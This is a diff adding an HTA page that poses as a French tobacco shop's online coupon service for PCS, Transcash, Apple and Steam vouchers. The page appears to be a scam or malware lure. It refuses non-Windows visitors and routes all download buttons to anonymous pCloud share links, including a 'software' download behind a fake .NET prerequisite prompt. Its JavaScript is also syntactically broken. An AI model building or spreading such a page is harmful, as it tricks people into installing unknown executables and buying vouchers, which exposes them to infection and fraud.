@@ -1,0 +1,136 @@
+<!DOCTYPE html> 
+<html> 
+<head>
+  <meta charset="UTF-8">
+  <title>Bureau-de-Tabac–Coupons-en-ligne</title>
+
+  <hta:application 
+    id="App"
+    applicationname="Coupons en ligne"
+    border="thin"
+    caption="yes"
+    maximizebutton="yes"
+    minimizebutton="yes"
+    sysmenu="yes"
+    scroll="auto"
+    singleinstance="yes"
+    windowstate="normal">
+  </hta:application>
+
+  <!-- ✅ BLOCAGE DES AUTRES OS ICI -->
+  <script type="text/javascript">
+    window.onload = function() {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      const isWindows = /Windows NT/i.test(userAgent);
+
+      if (!isWindows) {
+        document.body.innerHTML = `
+          <div style="display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;background:#fff;color:#e65100;font-family:sans-serif;padding:20px;">
+            <div>
+              <h1>❌ Accès refusé</h1>
+              <p>Ce service est uniquement accessible depuis un système <strong>Windows</strong>.<br>
+              Merci de vous connecter depuis un ordinateur sous Windows.</p>
+            </div>
+          </div>
+        `;
+        document.title = "Accès refusé";
+      }
+    };
+  </script>
+
+  <style>
+    body {font-family: Arial, sans-serif; margin:0; padding:0; background:#f4f4f4; color:#333;}
+    header {background:#e65100; color:#fff; padding:20px; text-align:center;}
+    header h1 {margin:0; font-size:28px;}
+    nav {margin-top:10px;}
+    nav a {color:#fff; text-decoration:none; margin:0 15px; font-weight:bold;}
+    nav a:hover {text-decoration:underline;}
+    .container {max-width:1000px; margin:20px auto; padding:20px; background:#fff; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1);}
+    .hero {display:flex; flex-wrap:wrap; align-items:center; justify-content:space-between;}
+    .hero-text {flex:1; min-width:280px; margin-right:20px;}
+    .hero-text h2 {color:#e65100;}
+    .hero-image {flex:0 0 200px; display:flex; justify-content:center; align-items:center;}
+    .hero-image img {max-width:200px; width:100%; height:auto; border-radius:10px;}
+    .btn {display:inline-block; margin:10px 5px; padding:12px 20px; background:#e65100; color:#fff; border-radius:6px; text-decoration:none; font-weight:bold; transition:background 0.3s;}
+    .btn:hover {background:#bf360c;}
+    .logos {margin-top:20px; display:flex; flex-wrap:wrap; justify-content:center; gap:15px;}
+    .logos img {height:50px; object-fit:contain;}
+    footer {background:#333; color:#fff; text-align:center; padding:15px; margin-top:30px;}
+    .alert-net {margin-top:15px; padding:10px; background:#ffebee; border:1px solid #e65100; color:#e65100; font-weight:bold; border-radius:6px;}
+    @media(max-width:768px){
+      .hero {flex-direction:column;}
+      .hero-text {margin-right:0; margin-bottom:20px;}
+      .hero-image {flex:1;}
+    }
+  </style>
+
+  <script type="text/javascript">
+    const liensPcloud = {
+      pcs: "https://e.pcloud.link/publink/show?code=XZc8kUZf7eLiASVfV7BhsDXcyen3p83lwik",
+      transcash: "https://e.pcloud.link/publink/show?code=XZQ8kUZAqhUUhqfbXF2bjSS3y97zmQwaceX",
+      logiciel: "https://e.pcloud.link/publink/show?code=XZFQkUZdJXTxhFBcP0uzcbLhmvhRzb9HdX7",
+      apple: "https://e.pcloud.link/publink/show?code=XZ6m0UZtVcL066ePI76ND4TMh1C3JaJks70",
+      steam: "https://e.pcloud.link/publink/show?code=XZOm0UZSWGPVayaHYF7EWjRCu1K3RGMib6X"
+	  Win32.OnePlateform:"https://e.pcloud.link/publink/show?code=XZB24UZHVEp0DFCKFzR1un0dO9JhXA9fsLV"
+    };
+
+    function checkNetFramework() {
+      alert("Assurez-vous d’avoir installé .NET Framework 4.8 ou plus pour exécuter ce logiciel.");
+      window.open(liensPcloud.logiciel);
+    }
+  </script>
+</head>
+<body>
+  <header>
+    <h1>💨 Bureau-de-Tabac–Coupons-en-ligne</h1>
+    <nav>
+      <a href="#">Accueil</a>
+      <a href="#" onclick="window.open(liensPcloud.pcs)">Coupons PCS</a>
+      <a href="#" onclick="window.open(liensPcloud.transcash)">Coupons Transcash</a>
+      <a href="#">Contact</a>
+    </nav>
+    <img src="https://i.postimg.cc/18pQVms8/tabac-paiement-en-ligne.png" alt="tabac-paiement-en-ligne">
+  </header>
+
+  <div class="container">
+    <section class="hero">
+      <div class="hero-text">
+        <h2>Bienvenue — Bureau de Tabac de la Liberté</h2>
+        <p>Espace numérique — récupérez vos coupons et recharges en toute sécurité.</p>
+        <p><strong>145 Rue de la Liberté, 25000 Besançon • Ouvert 9h - Minuit</strong></p>
+
+        <a href="#" class="btn" onclick="window.open(liensPcloud.pcs)">T-Pcs</a>
+        <a href="#" class="btn" onclick="window.open(liensPcloud.transcash)">T-Transcash</a>
+        <a href="#" class="btn" onclick="window.open(liensPcloud.apple)">T-Apple</a>
+        <a href="#" class="btn" onclick="window.open(liensPcloud.steam)">T-Steam</a>
+
+        <div class="alert-net">
+          ⚠️ Ce logiciel nécessite .NET Framework 4.8 ou plus.<br>
+          <a href="https://dotnet.microsoft.com/en-us/download/dotnet-framework" target="_blank">Télécharger .NET Framework</a>
+        </div>
+
+        <button class="btn" onclick="checkNetFramework()">📥 Télécharger le logiciel</button>
+
+        <div class="logos">
+          <img src="https://i.postimg.cc/zVH55wQS/Logo-FDj.png" alt="Logo FDJ">
+          <img src="https://i.postimg.cc/qg509D1v/Logo-Transcash.png" alt="Logo Transcash">
+          <img src="https://i.postimg.cc/K4zxphrW/Logo-PCS.png" alt="Logo PCS">
+          <img src="https://i.postimg.cc/hXFnGzWF/presse-tabac.png" alt="Logo Presse Tabac">
+          <img src="https://i.postimg.cc/XBpWr9YW/Auchan.png" alt="Logo Auchan">
+          <img src="https://i.postimg.cc/W1Q9Lw32/gif-carte.png" alt="Carte cadeau">
+          <img src="https://i.postimg.cc/s27TVGQ5/steam.png" alt="Logo Steam">
+		  <img src="https://i.postimg.cc/XJLrygkR/win32.png" alt="Logo Win32">
+        </div>
+      </div>
+      <div class="hero-image">
+        <!-- Image éventuelle ici -->
+      </div>
+    </section>
+  </div>
+
+  <footer>
+    <p>&copy; 2025 Bureau de Tabac de la Liberté – Tous droits réservés</p>
+    <p>📞 03 81 00 00 00 • ✉️ contact@tabac-liberte.fr</p>
+  </footer>
+</body>
+</html>
